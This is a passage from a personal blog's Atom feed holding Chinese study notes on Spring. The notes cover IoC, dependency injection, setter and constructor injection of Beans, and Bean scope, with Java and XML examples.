    <category term="Spring" scheme="https://kallenblue.github.io/categories/Spring/"/>
    
    
  </entry>
  
  <entry>
    <title>Spring/Bean的参数注入</title>
    <link href="https://kallenblue.github.io/2022/09/29/Spring/Spring-Bean%E7%9A%84%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/"/>
    <id>https://kallenblue.github.io/2022/09/29/Spring/Spring-Bean%E7%9A%84%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/</id>
    <published>2022-09-29T04:08:40.000Z</published>
    <updated>2022-09-29T15:22:42.084Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>笔记源自<a href="https://www.bilibili.com/video/BV1Fi4y1S7ix">黑马程序员2022新版SSM框架教程</a></p></blockquote><h1 id="setter注入"><a href="#setter注入" class="headerlink" title="setter注入"></a>setter注入</h1><p>需要提供set方法</p><h2 id="1-引用注入"><a href="#1-引用注入" class="headerlink" title="1.引用注入"></a>1.引用注入</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDao</span><span class="params">(TestDao dao)</span>&#123;</span><br><span class="line"><span class="built_in">this</span>.dao = dao;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDao2</span><span class="params">(Test2Dao dao2)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.dao2=dao2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;service&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.Learning1.service.impl.TestServiceImpl&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;prototype&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--name指引用属性的名称，ref指id名--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dao&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dao&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dao2&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dao2&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>纯注解使用@Autowired</p></blockquote><h2 id="2-简单类型注入"><a href="#2-简单类型注入" class="headerlink" title="2.简单类型注入"></a>2.简单类型注入</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2DaoImpl</span> <span class="keyword">implements</span> <span class="title class_">Test2Dao</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="type">int</span> val;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;This is an implementation of Test2Dao&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setVal</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.val = val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dao2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.Learning1.dao.impl.Test2DaoImpl&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;val&quot;</span> <span class="attr">value</span>=<span class="string">&quot;10&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>纯注解使用@Value</p></blockquote><h1 id="构造器注入"><a href="#构造器注入" class="headerlink" title="构造器注入"></a>构造器注入</h1><h2 id="1-引用类型"><a href="#1-引用类型" class="headerlink" title="1.引用类型"></a>1.引用类型</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TestDao dao;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">TestServiceImpl</span><span class="params">(TestDao dao)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.dao=dao;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;service&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.Learning1.service.impl.TestServiceImpl&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;prototype&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--name指引用属性的名称，ref指id名--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;dao&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dao&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-简单类型注入-1"><a href="#2-简单类型注入-1" class="headerlink" title="2.简单类型注入"></a>2.简单类型注入</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> val;</span><br><span class="line"><span class="keyword">private</span> String str;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Test2DaoImpl</span><span class="params">(<span class="type">int</span> val, String str)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.val = val;</span><br><span class="line"><span class="built_in">this</span>.str = str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="name绑定"><a href="#name绑定" class="headerlink" title="name绑定"></a>name绑定</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dao2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.Learning1.dao.impl.Test2DaoImpl&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;val&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2333&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;str&quot;</span> <span class="attr">value</span>=<span class="string">&quot;tst&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="type绑定"><a href="#type绑定" class="headerlink" title="type绑定"></a>type绑定</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dao2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.Learning1.dao.impl.Test2DaoImpl&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2333&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">value</span>=<span class="string">&quot;tst&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="index绑定"><a href="#index绑定" class="headerlink" title="index绑定"></a>index绑定</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dao2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.Learning1.dao.impl.Test2DaoImpl&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2333&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;tst&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;笔记源自&lt;a href=&quot;https://www.bilibili.com/video/BV1Fi4y1S7ix&quot;&gt;黑马程序员2022新版SSM框架教程&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;setter注入&quot;&gt;&lt;a href</summary>
      
    
    
    
    <category term="Spring" scheme="https://kallenblue.github.io/categories/Spring/"/>
    
    
    <category term="Bean" scheme="https://kallenblue.github.io/tags/Bean/"/>
    
  </entry>
  
  <entry>
    <title>Spring/IoC、DI、Bean</title>
    <link href="https://kallenblue.github.io/2022/09/29/Spring/Spring-IoC%E3%80%81DI%E3%80%81Bean/"/>
    <id>https://kallenblue.github.io/2022/09/29/Spring/Spring-IoC%E3%80%81DI%E3%80%81Bean/</id>
    <published>2022-09-28T16:01:31.000Z</published>
    <updated>2022-09-29T15:22:34.456Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>最近在学习SpringBoot，但是发现自己对Spring的一些基础知识不太了解，于是决定先学习Spring相关的一些知识再去了解SpringBoot，此类博客相当于是学习笔记，笔记源自<a href="https://www.bilibili.com/video/BV1Fi4y1S7ix">黑马程序员2022新版SSM框架教程</a></p></blockquote><h1 id="IoC"><a href="#IoC" class="headerlink" title="IoC"></a>IoC</h1><blockquote><p>Inversion of Control，控制反转</p></blockquote><p>使用对象时，由主动new产生对象转换成外部提供对象，对象创建的控制权交给外部，而这个”外部”在Spring里面被称为<strong>IoC容器</strong></p><h1 id="Bean"><a href="#Bean" class="headerlink" title="Bean"></a>Bean</h1><p>被创建或被管理的对象在IoC容器中统称为Bean</p><h1 id="DI"><a href="#DI" class="headerlink" title="DI"></a>DI</h1><blockquote><p>Dependency Injection，依赖注入<br>在IoC容器中建立Bean和Bean之间的依赖关系的整个过程称为依赖注入</p></blockquote><h1 id="实操案例IoC-xml实现"><a href="#实操案例IoC-xml实现" class="headerlink" title="实操案例IoC(xml实现)"></a>实操案例IoC(xml实现)</h1><h2 id="1-导入Spring坐标"><a href="#1-导入Spring坐标" class="headerlink" title="1.导入Spring坐标"></a>1.导入Spring坐标</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.22<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-定义Spring管理的类"><a href="#2-定义Spring管理的类" class="headerlink" title="2.定义Spring管理的类"></a>2.定义Spring管理的类</h2><p><strong>Dao</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">TestDao</span> &#123;</span><br><span class="line">  <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestDaoImpl</span> <span class="keyword">implements</span> <span class="title class_">TestDao</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;This is an implementation of TestDao&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Service</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">TestService</span> &#123;</span><br><span class="line">  <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">TestService</span> &#123;</span><br><span class="line"></span><br><span class="line">  TestDao dao;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;This is an implementation of TestService&quot;</span>);</span><br><span class="line">    dao.test();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDao</span><span class="params">(TestDao dao)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.dao = dao;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-创建Spring配置文件，配置Bean"><a href="#3-创建Spring配置文件，配置Bean" class="headerlink" title="3.创建Spring配置文件，配置Bean"></a>3.创建Spring配置文件，配置Bean</h2><p><strong>创建文件</strong><br><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/1a8f8747-6522-4d7d-9c6a-97acf9b1aca4.png"><br><strong>配置Bean</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--配置bean，id，class路径--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.Learning1.dao.impl.TestDaoImpl&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;service&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.Learning1.service.impl.TestServiceImpl&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>纯注解用@Component代替</p></blockquote><h2 id="4-初始化IoC容器，获取Bean"><a href="#4-初始化IoC容器，获取Bean" class="headerlink" title="4.初始化IoC容器，获取Bean"></a>4.初始化IoC容器，获取Bean</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">//加载配置文件得到上下文容器对象</span></span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">    <span class="comment">//获取资源</span></span><br><span class="line">    <span class="type">TestService</span> <span class="variable">testService</span> <span class="operator">=</span> (TestService) ctx.getBean(<span class="string">&quot;service&quot;</span>);</span><br><span class="line">    testService.test();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>纯注解创建一个Config类加上@Configuration注解获取容器对象改用如下形式</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">AnnotationConfigApplicationContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>(Config.class);</span><br></pre></td></tr></table></figure><h2 id="运行结果："><a href="#运行结果：" class="headerlink" title="运行结果："></a>运行结果：</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">This is an implementation of TestService</span><br><span class="line">This is an implementation of TestDao</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br></pre></td></tr></table></figure><h3 id="扩展：Bean的获取方式"><a href="#扩展：Bean的获取方式" class="headerlink" title="扩展：Bean的获取方式"></a>扩展：Bean的获取方式</h3><p><strong>1.使用bean名获取</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TestService</span> <span class="variable">testService</span> <span class="operator">=</span> (TestService) ctx.getBean(<span class="string">&quot;service&quot;</span>);</span><br></pre></td></tr></table></figure><p><strong>2.使用bean名获取，并指定类型</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TestService</span> <span class="variable">testService</span> <span class="operator">=</span> ctx.getBean(<span class="string">&quot;service&quot;</span>,TestService.class);</span><br></pre></td></tr></table></figure><p><strong>3.使用bean类型获取</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TestService</span> <span class="variable">testService</span> <span class="operator">=</span> ctx.getBean(TestService.class);</span><br></pre></td></tr></table></figure><blockquote><p>这种方式要求IoC容器中不能够有多个同类型的Bean</p></blockquote><h1 id="实操案例DI-XML"><a href="#实操案例DI-XML" class="headerlink" title="实操案例DI(XML)"></a>实操案例DI(XML)</h1><h2 id="1-删除使用new形式创建对象的代码，并设置setter方法"><a href="#1-删除使用new形式创建对象的代码，并设置setter方法" class="headerlink" title="1.删除使用new形式创建对象的代码，并设置setter方法"></a>1.删除使用new形式创建对象的代码，并设置setter方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">TestService</span> &#123;</span><br><span class="line"></span><br><span class="line">  TestDao dao;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Test</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;This is an implementation of TestService&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">setDao</span><span class="params">(TestDao dao)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.dao = dao;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-配置service与dao之间的关系"><a href="#2-配置service与dao之间的关系" class="headerlink" title="2.配置service与dao之间的关系"></a>2.配置service与dao之间的关系</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;service&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.Learning1.service.impl.TestServiceImpl&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--name指引用属性的名称，ref指id名--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dao&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dao&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>纯注解使用@Autowired</p></blockquote><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">This is an implementation of TestService</span><br><span class="line">This is an implementation of TestDao</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br></pre></td></tr></table></figure><h1 id="Bean的配置"><a href="#Bean的配置" class="headerlink" title="Bean的配置"></a>Bean的配置</h1><h2 id="1-Bean的别名"><a href="#1-Bean的别名" class="headerlink" title="1.Bean的别名"></a>1.Bean的别名</h2><p>可以在配置中添加name指定Bean的别名,可以有多个别名，别名之间可用空格，分号，逗号分隔</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dao&quot;</span> <span class="attr">name</span>=<span class="string">&quot;testDao testDao1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.Learning1.dao.impl.TestDaoImpl&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-Bean的创建模式"><a href="#2-Bean的创建模式" class="headerlink" title="2.Bean的创建模式"></a>2.Bean的创建模式</h2><p>Bean的默认创建模式为单例模式，每次引用同一个类的对象都是同一个对象，以提高效率。<br>如以下程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">    <span class="type">TestService</span> <span class="variable">testService1</span> <span class="operator">=</span> (TestService) ctx.getBean(<span class="string">&quot;service&quot;</span>);</span><br><span class="line">    <span class="type">TestService</span> <span class="variable">testService2</span> <span class="operator">=</span> (TestService) ctx.getBean(<span class="string">&quot;service&quot;</span>);</span><br><span class="line">    System.out.println(testService1);</span><br><span class="line">    System.out.println(testService2);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>输出结果为</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">com.Learning1.service.impl.TestServiceImpl@6b09bb57</span><br><span class="line">com.Learning1.service.impl.TestServiceImpl@6b09bb57</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br></pre></td></tr></table></figure><p>这个创建模式可以在配置文件中修改，将scope修改为prototype可以使同一个类创建不同的对象</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;service&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.Learning1.service.impl.TestServiceImpl&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;prototype&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>再次运行上一个程序</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">com.Learning1.service.impl.TestServiceImpl@6b09bb57</span><br><span class="line">com.Learning1.service.impl.TestServiceImpl@6536e911</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br></pre></td></tr></table></figure><h1 id="Bean的实例化方式"><a href="#Bean的实例化方式" class="headerlink" title="Bean的实例化方式"></a>Bean的实例化方式</h1><h2 id="无参构造器实例化"><a href="#无参构造器实例化" class="headerlink" title="无参构造器实例化"></a>无参构造器实例化</h2><p>Spring默认会调用Bean的无参构造器实例化Bean，如果没有无参构造器，将会报错</p><blockquote><p>给TestServiceImpl重写一个无参构造器</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">TestService</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">TestServiceImpl</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Generator is Running....&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  TestDao dao;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;This is an implementation of 